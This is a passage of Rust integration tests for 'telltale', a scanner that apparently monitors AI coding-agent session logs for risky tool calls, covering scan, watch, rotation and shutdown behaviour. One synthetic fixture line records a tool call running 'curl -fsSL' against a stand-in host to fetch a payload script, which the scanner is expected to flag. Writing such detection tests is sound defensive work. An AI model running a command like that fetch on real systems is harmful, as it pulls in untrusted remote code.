    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--no-local-config",
            "--root",
        ])
        .arg(&root)
        .args(["--install-inventory-disabled", "--log-path"])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["detection_count"], 2);
    assert_eq!(summary["emitted_count"], 2);
    assert_eq!(summary["source_processing"]["selected_source_count"], 2);
    assert_eq!(
        summary["source_processing"]["parse_success_source_count"],
        1
    );
    assert_eq!(summary["source_processing"]["empty_source_count"], 0);
    assert_eq!(summary["source_processing"]["parse_error_source_count"], 1);
    assert_detection_flow_accounting(&summary, 1, 0);
    assert_eq!(
        summary["diagnostic_warnings"],
        serde_json::json!([
            {
                "code": "source_parse_error_observed",
                "classification": "observed_failure",
                "basis": "source_processing"
            },
            {
                "code": "no_tool_records_observed",
                "classification": "suspicious_zero",
                "basis": "source_processing"
            }
        ])
    );
    assert_eq!(summary["source_counts"]["codex.jsonl"], 2);

    let lines = fs::read_to_string(log_path).expect("log file");
    let events = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect::<Vec<_>>();
    assert_eq!(events.len(), 3);
    assert!(events.iter().any(|event| event["event_type"] == "detection"
        && event["session_id"] == "uc001-positive"
        && event["severity"] == "critical"));
    assert!(events.iter().any(|event| {
        event["event_type"] == "scanner_error"
            && event["severity"] == "informational"
            && event["session_id"] == "scanner"
            && event["tags"]
                .as_array()
                .unwrap()
                .contains(&Value::String("parse_failure".to_string()))
    }));
}

#[test]
fn scan_once_refuses_fixture_root_without_allow_fixtures() {
    let temp = tempdir().expect("tempdir");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--root",
            "tests/fixtures/session_stores",
            "--log-path",
        ])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("refusing to write fixture/demo data"));
    assert!(!log_path.exists());
}

#[test]
fn scan_once_allows_fixture_root_with_dry_run() {
    let temp = tempdir().expect("tempdir");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--dry-run",
            "--no-local-config",
            "--root",
            "tests/fixtures/session_stores",
            "--log-path",
        ])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["event_type"], "health");
    assert_eq!(summary["detection_count"], 36);
}

#[test]
fn watch_command_is_available_for_realtime_scans() {
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["watch", "--help"])
        .output()
        .expect("run telltale watch help");

    assert!(
        output.status.success(),
        "watch help failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("Watch local session stores"));
    assert!(stdout.contains("--debounce-ms"));
    assert!(stdout.contains("--min-scan-interval-ms"));
    assert!(stdout.contains("--iterations"));
    assert!(stdout.contains("--client"));
}

fn copy_dir_recursive(src: &Path, dst: &Path) {
    fs::create_dir_all(dst).expect("create copy target dir");
    for entry in fs::read_dir(src).expect("read copy source dir") {
        let entry = entry.expect("copy dir entry");
        let target = dst.join(entry.file_name());
        if entry.file_type().expect("copy entry file type").is_dir() {
            copy_dir_recursive(&entry.path(), &target);
        } else {
            fs::copy(entry.path(), &target).expect("copy fixture file");
        }
    }
}

#[cfg(target_os = "linux")]
fn wait_for_watch_ready(pid: u32) {
    let fd_path = format!("/proc/{pid}/fd");
    let fdinfo_path = format!("/proc/{pid}/fdinfo");
    let deadline = Instant::now() + Duration::from_secs(20);
    loop {
        let ready = fs::read_dir(&fd_path)
            .expect("read child file descriptors")
            .filter_map(Result::ok)
            .any(|entry| {
                let Ok(target) = fs::read_link(entry.path()) else {
                    return false;
                };
                if !target.to_string_lossy().contains("inotify") {
                    return false;
                }
                let Ok(fd) = entry.file_name().into_string() else {
                    return false;
                };
                fs::read_to_string(format!("{fdinfo_path}/{fd}"))
                    .map(|fdinfo| {
                        fdinfo
                            .lines()
                            .any(|line| line.trim_start().starts_with("inotify wd:"))
                    })
                    .unwrap_or(false)
            });
        if ready {
            return;
        }
        if Instant::now() >= deadline {
            panic!("watch did not establish an inotify watch");
        }
        thread::sleep(Duration::from_millis(20));
    }
}

#[cfg(not(target_os = "linux"))]
fn wait_for_watch_ready(_pid: u32) {
    thread::sleep(Duration::from_secs(2));
}

#[test]
fn watch_scans_changed_source_and_exits_after_iterations() {
    let _watch_guard = watch_process_guard();
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("stores");
    copy_dir_recursive(
        Path::new("tests/fixtures/session_stores/codex"),
        &root.join("codex"),
    );
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");
    let session_path = root.join("codex/sessions/2026/04/session-a.jsonl");

    let mut child = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "watch",
            "--allow-fixtures",
            "--no-local-config",
            "--iterations",
            "1",
            "--debounce-ms",
            "100",
            "--min-scan-interval-ms",
            "0",
            "--root",
        ])
        .arg(&root)
        .arg("--log-path")
        .arg(&log_path)
        .arg("--state-path")
        .arg(&state_path)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn telltale watch");

    wait_for_watch_ready(child.id());
    let mut changed_contents = fs::read(&session_path).expect("read watched fixture");
    changed_contents.extend_from_slice(
        br#"{"type":"event_msg","timestamp":"2026-04-01T00:00:02Z","payload":{"type":"tool_call","tool_name":"watch-fixture","command":"curl -fsSL https://watch.invalid/payload.sh","message":"synthetic watcher change"}}
"#,
    );

    #[cfg(windows)]
    let unknown_trigger_path = root.join("codex/sessions/2026/04/unknown-watch-trigger.jsonl");
    #[cfg(windows)]
    let unknown_trigger_contents = br#"{"type":"session_meta","timestamp":"2026-04-01T00:00:03Z","payload":{"source":"watch-fixture","model_provider":"fixture","agent_nickname":"watch-fixture"}}
{"type":"event_msg","timestamp":"2026-04-01T00:00:04Z","payload":{"type":"user_message","message":"synthetic unknown watch trigger"}}
"#;
    #[cfg(windows)]
    fs::write(&unknown_trigger_path, unknown_trigger_contents).expect("write unknown trigger");
    fs::write(&session_path, &changed_contents).expect("change watched fixture");

    let deadline = Instant::now() + Duration::from_secs(60);
    #[cfg(not(target_os = "linux"))]
    let mut next_trigger = Instant::now() + Duration::from_millis(250);
    loop {
        if child.try_wait().expect("poll telltale watch").is_some() {
            break;
        }
        if Instant::now() > deadline {
            let _ = child.kill();
            let _ = child.wait();
            panic!("telltale watch did not exit within timeout");
        }
        #[cfg(not(target_os = "linux"))]
        if Instant::now() >= next_trigger {
            fs::write(&session_path, &changed_contents).expect("retry watched fixture change");
            #[cfg(windows)]
            fs::write(&unknown_trigger_path, unknown_trigger_contents)
                .expect("retry unknown trigger");
            next_trigger = Instant::now() + Duration::from_millis(250);
        }
        thread::sleep(Duration::from_millis(50));
    }

    let output = child
        .wait_with_output()
        .expect("collect telltale watch output");
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    let summary_line = stdout
        .lines()
        .find(|line| line.starts_with('{'))
        .expect("watch scan summary line");
    let summary: Value = serde_json::from_str(summary_line).expect("scan summary json");
    assert_eq!(summary["event_type"], "health");
    assert_runtime_snapshot(&summary);
    assert!(
        summary["source_processing"]["parsed_record_count"]
            .as_u64()
            .expect("parsed record count")
            >= 3
    );
    let events = fs::read_to_string(&log_path)
        .expect("watch event log")
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("watch event json"))
        .collect::<Vec<_>>();
    let changed_detection = events
        .iter()
        .find(|event| {
            event["event_type"] == "detection"
                && event["rule_ids"]
                    .as_array()
                    .expect("rule ids")
                    .iter()
                    .any(|rule| rule == "network.download")
        })
        .expect("network.download detection");
    assert!(
        changed_detection["source_path_hash"].as_str().is_some_and(
            |hash| hash.len() == 64 && hash.bytes().all(|byte| byte.is_ascii_hexdigit())
        )
    );
    #[cfg(not(windows))]
    assert_eq!(
        summary["source_discovery"]["basis"],
        "watch_source_index_snapshot"
    );
    #[cfg(not(windows))]
    assert_eq!(
        summary["source_discovery"]["performed_for_current_scan"],
        false
    );
    #[cfg(windows)]
    assert_eq!(summary["source_discovery"]["basis"], "current_full_scan");
    #[cfg(windows)]
    assert_eq!(
        summary["source_discovery"]["performed_for_current_scan"],
        true
    );
    assert!(
        summary["source_discovery"]["operational_source_count"]
            .as_u64()
            .unwrap()
            >= summary["source_processing"]["selected_source_count"]
                .as_u64()
                .unwrap()
    );
    assert_eq!(
        summary["effective_configuration"]["local_config"]["mode"],
        "disabled"
    );
    assert!(
        log_path.exists(),
        "watch scan should write events to the log path"
    );
    assert!(
        state_path.exists(),
        "watch scan should persist scanner state"
    );
}

#[test]
fn watch_skips_no_op_state_save() {
    let _watch_guard = watch_process_guard();
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("stores");
    copy_dir_recursive(
        Path::new("tests/fixtures/session_stores/codex"),
        &root.join("codex"),
    );
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let mut child = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "watch",
            "--allow-fixtures",
            "--no-local-config",
            "--iterations",
            "2",
            "--debounce-ms",
            "100",
            "--min-scan-interval-ms",
            "0",
            "--root",
        ])
        .arg(&root)
        .arg("--log-path")
        .arg(&log_path)
        .arg("--state-path")
        .arg(&state_path)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn telltale watch");
    let stdout = child.stdout.take().expect("watch stdout");
    let (summary_tx, summary_rx) = mpsc::channel();
    thread::spawn(move || {
        for line in BufReader::new(stdout).lines().map_while(Result::ok) {
            if summary_tx.send(line).is_err() {
                break;
            }
        }
    });

    // Allow the watcher to finish initialization, then issue exactly one
    // unrelated change. An unknown path forces a full reconciliation, and
    // waiting for its summary prevents that first trigger from accidentally
    // satisfying the second iteration.
    wait_for_watch_ready(child.id());
    let first_trigger = root.join("codex/sessions/first-trigger.txt");
    #[cfg(target_os = "linux")]
    let first_attempt = 1;
    #[cfg(not(target_os = "linux"))]
    let mut first_attempt = 1;
    fs::write(
        &first_trigger,
        format!("watch first trigger {first_attempt}\n"),
    )
    .expect("write first trigger");
    #[cfg(not(target_os = "linux"))]
    let mut next_retry = Instant::now() + Duration::from_secs(5);
    let first_deadline = Instant::now() + Duration::from_secs(60);
    let first_summary = loop {
        match summary_rx.recv_timeout(Duration::from_millis(100)) {
            Ok(line) => break line,
            Err(mpsc::RecvTimeoutError::Timeout) => {}
            Err(mpsc::RecvTimeoutError::Disconnected) => {
                panic!("watch summary reader disconnected before first scan completed")
            }
        }
        if let Some(status) = child.try_wait().expect("poll telltale watch") {
            panic!("telltale watch exited before first scan completed: {status:?}");
        }
        if Instant::now() >= first_deadline {
            let _ = child.kill();
            let _ = child.wait();
            panic!("telltale watch did not complete the first triggered scan within timeout");
        }
        #[cfg(not(target_os = "linux"))]
        if Instant::now() >= next_retry {
            first_attempt += 1;
            fs::write(
                &first_trigger,
                format!("watch first trigger {first_attempt}\n"),
            )
            .expect("retry first trigger");
            next_retry = Instant::now() + Duration::from_secs(5);
        }
    };

    let state_before = fs::read(&state_path).expect("read first state snapshot");
    let mtime_before = fs::metadata(&state_path)
        .expect("state metadata")
        .modified()
        .expect("state mtime");

    // Trigger a full reconciliation with an unrelated path. No new records
    // means no emitted events and no durable state changes, so the state-save
    // should be skipped.
    let noop_trigger = root.join("codex/sessions/noop-trigger.txt");
    fs::write(&noop_trigger, b"watch test trigger\n").expect("write no-op trigger");

    // Wait for the second iteration to finish and the process to exit.
    let deadline = Instant::now() + Duration::from_secs(60);
    loop {
        if child.try_wait().expect("poll telltale watch").is_some() {
            break;
        }
        if Instant::now() > deadline {
            let _ = child.kill();
            let _ = child.wait();
            panic!("telltale watch did not exit after second scan within timeout");
        }
        thread::sleep(Duration::from_millis(100));
    }

    let output = child
        .wait_with_output()
        .expect("collect telltale watch output");
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let mut summaries =
        vec![serde_json::from_str::<Value>(&first_summary).expect("first watch summary json")];
    summaries.extend(
        summary_rx
            .iter()
            .map(|line| serde_json::from_str::<Value>(&line).expect("watch summary json")),
    );
    assert_eq!(summaries.len(), 2);
    assert_runtime_snapshot(&summaries[0]);
    assert_eq!(summaries[0]["runtime"], summaries[1]["runtime"]);
    assert_eq!(
        summaries[0]["effective_configuration"],
        summaries[1]["effective_configuration"]
    );
    assert_eq!(
        summaries[0]["source_discovery"]["basis"],
        "current_full_scan"
    );
    assert_eq!(
        summaries[0]["source_discovery"]["performed_for_current_scan"],
        true
    );
    assert_eq!(
        summaries[1]["source_discovery"]["basis"],
        "current_full_scan"
    );

    let state_after = fs::read(&state_path).expect("read second state snapshot");
    let mtime_after = fs::metadata(&state_path)
        .expect("state metadata")
        .modified()
        .expect("state mtime");
    assert_eq!(
        state_before, state_after,
        "no-op watch scan should not rewrite state bytes"
    );
    assert_eq!(
        mtime_before, mtime_after,
        "no-op watch scan should not rewrite state file"
    );
}

#[cfg(target_os = "linux")]
struct WatchChildGuard {
    child: Option<std::process::Child>,
}

#[cfg(target_os = "linux")]
impl WatchChildGuard {
    fn new(child: std::process::Child) -> Self {
        Self { child: Some(child) }
    }

    fn id(&self) -> u32 {
        self.child.as_ref().expect("watch child guard").id()
    }

    fn child_mut(&mut self) -> &mut std::process::Child {
        self.child.as_mut().expect("watch child guard")
    }

    fn disarm(mut self) -> std::process::Child {
        self.child.take().expect("watch child guard")
    }
}

#[cfg(target_os = "linux")]
impl Drop for WatchChildGuard {
    fn drop(&mut self) {
        if let Some(child) = self.child.as_mut() {
            if child.try_wait().ok().flatten().is_none() {
                let _ = child.kill();
            }
            let _ = child.wait();
        }
    }
}

#[cfg(target_os = "linux")]
#[test]
#[ignore = "Phase 4 synthetic watch soak; run explicitly on Linux"]
fn watch_synthetic_multi_cycle_soak() {
    let _watch_guard = watch_process_guard();
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("stores");
    let sessions = root.join("codex/sessions");
    fs::create_dir_all(&sessions).expect("codex sessions dir");
    let malformed_path = sessions.join("malformed-source.jsonl");
    fs::copy(
        Path::new("tests/fixtures/rule_samples/malformed-source.jsonl"),
        &malformed_path,
    )
    .expect("copy malformed fixture");
    let valid_later_path = sessions.join("uc001-positive.jsonl");
    let valid_later = include_bytes!(
        "../../tests/fixtures/session_stores/codex/sessions/2026/04/uc001-positive.jsonl"
    );
    let valid_second_path = sessions.join("uc001-positive-server-instructions.jsonl");
    let valid_second = include_bytes!(
        "../../tests/fixtures/session_stores/codex/sessions/2026/04/uc001-positive-server-instructions.jsonl"
    );
    let valid_third_path = sessions.join("uc001-positive-tool-description.jsonl");
    let valid_third = include_bytes!(
        "../../tests/fixtures/session_stores/codex/sessions/2026/04/uc001-positive-tool-description.jsonl"
    );
    for path in [&valid_later_path, &valid_second_path, &valid_third_path] {
        fs::write(path, b"").expect("pre-create valid source");
    }

    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");
    let mut child = WatchChildGuard::new(
        Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args([
                "watch",
                "--allow-fixtures",
                "--no-local-config",
                "--client",
                "codex",
                "--iterations",
                "6",
                "--debounce-ms",
                "100",
                "--min-scan-interval-ms",
                "0",
                "--install-inventory-disabled",
                "--log-rotate-max-size",
                "1",
                "--log-rotate-keep",
                "2",
                "--root",
            ])
            .arg(&root)
            .arg("--log-path")
            .arg(&log_path)
            .arg("--state-path")
            .arg(&state_path)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .expect("spawn telltale watch soak"),
    );

    let (summary_tx, summary_rx) = mpsc::channel();
    let stdout = child.child_mut().stdout.take().expect("watch stdout");
    let stdout_reader = thread::spawn(move || {
        for line in BufReader::new(stdout).lines().map_while(Result::ok) {
            if summary_tx.send(line).is_err() {
                break;
            }
        }
    });
    let pid = child.id();
    let proc_fd_path = format!("/proc/{pid}/fd");
    let proc_fdinfo_path = format!("/proc/{pid}/fdinfo");
    if !Path::new("/proc").is_dir()
        || fs::read_dir("/proc/self/fd").is_err()
        || !Path::new(&proc_fd_path).is_dir()
        || !Path::new(&proc_fdinfo_path).is_dir()
    {
        panic!("Linux procfs prerequisite unavailable for watch readiness: /proc/<pid>/fd");
    }
    let readiness_deadline = Instant::now() + Duration::from_secs(20);
    loop {
        let mut has_inotify_watch = false;
        for entry in fs::read_dir(&proc_fd_path)
            .expect("Linux procfs prerequisite unavailable while reading child fds")
        {
            let entry = entry.expect("Linux procfs prerequisite unavailable while reading fd");
            match fs::read_link(entry.path()) {
                Ok(target) if target.to_string_lossy().contains("inotify") => {
                    let Some(fd) = entry.file_name().to_string_lossy().parse::<u32>().ok() else {
                        continue;
                    };
                    let fdinfo = match fs::read_to_string(format!("{proc_fdinfo_path}/{fd}")) {
                        Ok(fdinfo) => fdinfo,
                        Err(error) if error.kind() == std::io::ErrorKind::NotFound => continue,
                        Err(error) => panic!(
                            "Linux procfs prerequisite unavailable while reading inotify fdinfo: {error}"
                        ),
                    };
                    if fdinfo
                        .lines()
                        .any(|line| line.trim_start().starts_with("inotify wd:"))
                    {
                        has_inotify_watch = true;
                        break;
                    }
                }
                Ok(_) => {}
                Err(error) if error.kind() == std::io::ErrorKind::NotFound => {}
                Err(error) => {
                    panic!("Linux procfs prerequisite unavailable while reading fd target: {error}")
                }
            }
        }
        if has_inotify_watch {
            break;
        }
        if Instant::now() >= readiness_deadline {
            let _ = child.child_mut().kill();
            let _ = child.child_mut().wait();
            panic!(
                "Linux inotify readiness prerequisite unavailable: no inotify fdinfo contained an inotify wd: line"
            );
        }
        thread::sleep(Duration::from_millis(20));
    }
    let fd_count = || {
        let mut count = 0;
        for entry in fs::read_dir(&proc_fd_path).expect("read child file descriptors") {
            entry.expect("read child file descriptor");
            count += 1;
        }
        count
    };

    let wait_for_next_scan = |child: &mut std::process::Child,
                              path: &Path,
                              contents: &[u8],
                              allow_exit_during_quiet: bool| {
        match summary_rx.try_recv() {
            Ok(_) => panic!("unexpected extra watch summary before single-cycle write"),
            Err(mpsc::TryRecvError::Disconnected) => {
                panic!("watch summary reader disconnected before single-cycle write")
            }
            Err(mpsc::TryRecvError::Empty) => {}
        }
        fs::write(path, contents).expect("trigger exactly one watch event");
        let deadline = Instant::now() + Duration::from_secs(20);
        let summary = loop {
            match summary_rx.recv_timeout(Duration::from_millis(20)) {
                Ok(line) => break serde_json::from_str::<Value>(&line).expect("summary json"),
                Err(mpsc::RecvTimeoutError::Timeout) => {}
                Err(mpsc::RecvTimeoutError::Disconnected) => {
                    panic!("watch summary reader disconnected before scan completed")
                }
            }
            if let Some(status) = child.try_wait().expect("poll telltale watch") {
                panic!("telltale watch exited before scan completed: {status:?}")
            }
            if Instant::now() >= deadline {
                let _ = child.kill();
                let _ = child.wait();
                panic!("telltale watch did not complete the single triggered scan within timeout")
            }
        };
        let quiet_deadline = Instant::now() + Duration::from_millis(150);
        while Instant::now() < quiet_deadline {
            let remaining = quiet_deadline.saturating_duration_since(Instant::now());
            match summary_rx.recv_timeout(remaining.min(Duration::from_millis(20))) {
                Ok(_) => panic!("extra watch summary followed a single-cycle write"),
                Err(mpsc::RecvTimeoutError::Timeout) => {}
                Err(mpsc::RecvTimeoutError::Disconnected) => {
                    if !allow_exit_during_quiet {
                        panic!("watch summary reader disconnected during quiet period")
                    }
                    thread::sleep(remaining);
                    break;
                }
            }
            if child
                .try_wait()
                .expect("poll telltale watch quiet period")
                .is_some()
                && !allow_exit_during_quiet
            {
                panic!("telltale watch exited unexpectedly during quiet period")
            }
        }
        summary
    };
    let telemetry_paths = || {
        fs::read_dir(temp.path())
            .expect("read telemetry directory")
            .map(|entry| entry.expect("telemetry entry").path())
            .filter(|path| {
                path.file_name()
                    .and_then(|name| name.to_str())
                    .is_some_and(|name| {
                        name == "telltale-events.jsonl"
                            || (name.starts_with("telltale-events-") && name.ends_with(".jsonl"))
                    })
            })
            .collect::<Vec<_>>()
    };
    let rotated_paths = || {
        telemetry_paths()
            .into_iter()
            .filter(|path| path != &log_path)
            .collect::<Vec<_>>()
    };
    let read_events = || {
        telemetry_paths()
            .iter()
            .flat_map(|path| {
                fs::read_to_string(path)
                    .expect("read telemetry file")
                    .lines()
                    .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
                    .collect::<Vec<_>>()
            })
            .collect::<Vec<_>>()
    };
    let assert_detection = |session_id: &str| {
        assert!(
            read_events().iter().any(|event| {
                event["event_type"] == "detection" && event["session_id"] == session_id
            }),
            "expected detection for {session_id} after its scan"
        );
    };
    let malformed = fs::read(&malformed_path).expect("read malformed fixture");
    let mut summaries = Vec::new();
    summaries.push(wait_for_next_scan(
        child.child_mut(),
        &malformed_path,
        &malformed,
        false,
    ));
    assert_eq!(summaries[0]["event_type"], "health");
    assert_eq!(summaries[0]["detection_count"], 1);
    assert_eq!(summaries[0]["emitted_count"], 1);
    assert_eq!(summaries[0]["delivery"]["status"], "delivered");
    let first_events = fs::read_to_string(&log_path).expect("first telemetry");
    assert!(first_events.lines().any(|line| {
        serde_json::from_str::<Value>(line).expect("first event json")["event_type"]
            == "scanner_error"
    }));
    let fd_baseline = fd_count();
    let mut fd_counts: Vec<usize> = vec![fd_baseline];

    let read_state = || {
        let bytes = fs::read(&state_path).expect("scanner state");
        let state = serde_json::from_slice::<Value>(&bytes).expect("scanner state json");
        (state, bytes.len())
    };
    let (first_state, first_state_bytes) = read_state();
    let first_state_mtime = fs::metadata(&state_path)
        .expect("first state metadata")
        .modified()
        .expect("first state mtime");

    let run_noop = |child: &mut std::process::Child,
                    path: &Path,
                    contents: &[u8],
                    prior_state: &Value,
                    prior_mtime: std::time::SystemTime| {
        thread::sleep(Duration::from_millis(2_100));
        let summary = wait_for_next_scan(child, path, contents, false);
        let fd_sample = fd_count();
        let (state, bytes) = read_state();
        let mtime = fs::metadata(&state_path)
            .expect("no-op state metadata")
            .modified()
            .expect("no-op state mtime");
        assert_eq!(&state, prior_state);
        assert_eq!(mtime, prior_mtime);
        assert_eq!(summary["event_type"], "health");
        assert_eq!(summary["detection_count"], 1);
        assert_eq!(summary["emitted_count"], 0);
        assert_eq!(summary["delivery"]["status"], "delivered");
        (summary, state, bytes, mtime, fd_sample)
    };

    let (second_summary, second_state, second_state_bytes, _, second_fd) = run_noop(
        child.child_mut(),
        &malformed_path,
        &malformed,
        &first_state,
        first_state_mtime,
    );
    summaries.push(second_summary);
    fd_counts.push(second_fd);

    let valid_summary =
        wait_for_next_scan(child.child_mut(), &valid_later_path, valid_later, false);
    assert_eq!(valid_summary["emitted_count"], 1);
    summaries.push(valid_summary);
    assert_detection("uc001-positive");
    fd_counts.push(fd_count());
    let (state_after_valid, valid_state_bytes) = read_state();
    let valid_state_mtime = fs::metadata(&state_path)
        .expect("valid state metadata")
        .modified()
        .expect("valid state mtime");
    assert_ne!(state_after_valid, second_state);
    let first_rotated_paths = rotated_paths();
    assert_eq!(first_rotated_paths.len(), 1);
    let oldest_rotated_path = first_rotated_paths
        .into_iter()
        .next()
        .expect("first rotated path");

    let (no_op_summary, _state_after_noop, no_op_state_bytes, _, no_op_fd) = run_noop(
        child.child_mut(),
        &valid_later_path,
        valid_later,
        &state_after_valid,
        valid_state_mtime,
    );
    summaries.push(no_op_summary);
    fd_counts.push(no_op_fd);

    let followup_sources: [(&Path, &[u8], &str, bool); 2] = [
        (
            &valid_second_path,
            valid_second,
            "uc001-positive-server-instructions",
            false,
        ),
        (
            &valid_third_path,
            valid_third,
            "uc001-positive-tool-description",
            true,
        ),
    ];
    let mut scanner_errors_before_pruning = 0;
    for (index, (path, contents, session_id, terminal)) in followup_sources.into_iter().enumerate()
    {
        let summary = wait_for_next_scan(child.child_mut(), path, contents, terminal);
        assert_eq!(summary["emitted_count"], 1);
        summaries.push(summary);
        assert_detection(session_id);
        if index == 0 {
            fd_counts.push(fd_count());
            scanner_errors_before_pruning = read_events()
                .iter()
                .filter(|event| event["event_type"] == "scanner_error")
                .count();
            assert_eq!(scanner_errors_before_pruning, 1);
        }
    }

    let exit_deadline = Instant::now() + Duration::from_secs(20);
    let final_status = loop {
        if let Some(status) = child
            .child_mut()
            .try_wait()
            .expect("poll final telltale watch")
        {
            break status;
        }
        if Instant::now() >= exit_deadline {
            let _ = child.child_mut().kill();
            let _ = child.child_mut().wait();
            panic!("telltale watch did not exit after finite soak iterations")
        }
        thread::sleep(Duration::from_millis(20));
    };
    assert!(
        final_status.success(),
        "watch soak failed: {final_status:?}"
    );
    let exited_child = child.disarm();
    let output = exited_child
        .wait_with_output()
        .expect("collect telltale watch output");
    stdout_reader.join().expect("join watch summary reader");
    assert!(!Path::new(&proc_fd_path).exists());

    assert_eq!(summaries.len(), 6, "every triggered scan must complete");
    assert!(
        summaries
            .iter()
            .all(|summary| summary["event_type"] == "health")
    );
    assert!(summaries[2]["detection_count"].as_u64().unwrap_or(0) > 0);
    assert!(summaries[4]["detection_count"].as_u64().unwrap_or(0) > 0);
    assert!(summaries[5]["detection_count"].as_u64().unwrap_or(0) > 0);
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let rotated_count = rotated_paths().len();
    assert_eq!(rotated_count, 2, "rotation should retain exactly two files");
    assert!(!oldest_rotated_path.exists());

    let events = read_events();
    assert!(events.iter().any(|event| {
        event["event_type"] == "detection" && event["session_id"] == "uc001-positive"
    }));
    assert!(events.iter().any(|event| {
        event["event_type"] == "detection"
            && event["session_id"] == "uc001-positive-server-instructions"
    }));
    assert!(events.iter().any(|event| {
        event["event_type"] == "detection"
            && event["session_id"] == "uc001-positive-tool-description"
    }));

    assert!(
        fd_counts
            .iter()
            .all(|count| *count <= fd_baseline.saturating_add(2)),
        "watch fd count exceeded the justified two-descriptor delta from baseline {fd_baseline}: {fd_counts:?}"
    );
    println!(
        "watch soak measurements: cycles={} state_bytes=[{first_state_bytes},{second_state_bytes},{valid_state_bytes},{no_op_state_bytes}] fd_baseline={fd_baseline} fd_counts={fd_counts:?} rotated_files={rotated_count} scanner_errors_before_pruning={scanner_errors_before_pruning}",
        summaries.len(),
    );
}

#[cfg(unix)]
#[test]
fn watch_exits_cleanly_on_sigterm() {
    let _watch_guard = watch_process_guard();
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("stores");
    copy_dir_recursive(
        Path::new("tests/fixtures/session_stores/codex"),
        &root.join("codex"),
    );

    let mut child = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["watch", "--dry-run", "--no-local-config", "--root"])
        .arg(&root)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn telltale watch");

    // Give the process time to install the signal handler and watcher.
    thread::sleep(Duration::from_secs(2));
    wait_for_watch_ready(child.id());
    let kill = Command::new("kill")
        .arg(child.id().to_string())
        .status()
        .expect("send SIGTERM");
    assert!(kill.success());

    let deadline = Instant::now() + Duration::from_secs(15);
    loop {
        if let Some(status) = child.try_wait().expect("poll telltale watch") {
            assert!(
                status.success(),
                "watch should exit cleanly on SIGTERM, got {status:?}"
            );
            break;
        }
        if Instant::now() > deadline {
            let _ = child.kill();
            let _ = child.wait();
            panic!("telltale watch did not exit after SIGTERM");
        }
        thread::sleep(Duration::from_millis(100));
    }
}

#[test]
fn watch_rejects_unknown_client_filter() {
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "watch",
            "--dry-run",
            "--root",
            "tests/fixtures/session_stores",
            "--client",
            "unknown-agent",
        ])
        .output()
        .expect("run telltale watch");

    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("unsupported client 'unknown-agent'"));
    assert!(stderr.contains("codex"));
    assert!(stderr.contains("gemini"));
}

#[test]
fn scan_once_emits_native_high_risk_detection_without_network() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_stores");
    let codex_sessions = root.join("codex/sessions/2026/04");
    fs::create_dir_all(&codex_sessions).expect("codex sessions dir");
    fs::write(
        codex_sessions.join("uc001-positive.jsonl"),
        include_str!(
            "../../tests/fixtures/session_stores/codex/sessions/2026/04/uc001-positive.jsonl"
        ),
    )
    .expect("uc001 fixture");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");
    let listener = TcpListener::bind("127.0.0.1:0").expect("bind no-network probe");
    listener
        .set_nonblocking(true)
        .expect("nonblocking no-network probe");
    let api_base = format!("http://{}", listener.local_addr().expect("probe address"));
    let rule_path = std::env::current_dir()
        .expect("repo cwd")
        .join("config/rules/tool-call-regex.yaml");
    fs::write(
        temp.path().join(".env"),
        format!(
            "LITELLM_API_BASE={api_base}\nLITELLM_API_KEY=test-key\nMODEL=triage-model\nLLAMA_GUARD_MODEL=guard-model\n"
